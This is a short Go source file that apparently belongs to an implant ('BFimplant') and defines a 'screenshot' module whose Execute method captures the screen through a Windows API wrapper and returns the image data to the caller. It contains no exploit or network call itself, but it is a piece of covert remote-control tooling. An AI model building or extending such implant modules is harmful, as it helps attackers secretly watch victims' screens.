package modules

import (
	"fmt"
    "BFimplant/winapiV2"

)

type ScreenshotModule struct{}

func NewScreenshotModule() *ScreenshotModule {
    return &ScreenshotModule{}
}

func (m *ScreenshotModule) Name() string {
    return "screenshot"
}

func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error) {

    // Encode the buffer to a base64 string
    

    res, errrr := winapiV2.GetScreenshot()
    if errrr != nil {
        return "", fmt.Errorf("failed to get screenshot: %w", errrr)
    }

    return res, nil
}
